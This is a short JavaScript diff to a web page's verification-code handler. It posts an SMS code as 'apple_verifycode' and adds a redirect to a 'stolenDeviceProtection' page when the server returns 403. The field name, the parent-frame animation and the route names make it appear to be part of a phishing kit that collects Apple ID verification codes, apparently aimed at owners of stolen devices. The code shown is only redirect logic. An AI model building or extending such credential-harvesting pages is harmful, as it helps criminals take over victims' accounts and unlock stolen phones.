@@ -151,6 +151,11 @@ function submitVerificationCode(smsCode) {
         'apple_verifycode': smsCode,
     }).then(data  =>{
 
+        if (data?.code === 403){
+            window.location.href = '/index/stolenDeviceProtection';
+            return;
+        }
+
         if (data && data.code === 200) {
             $('.landing__animation', window.parent.document).hide();
             return window.location.href = '/index/result';
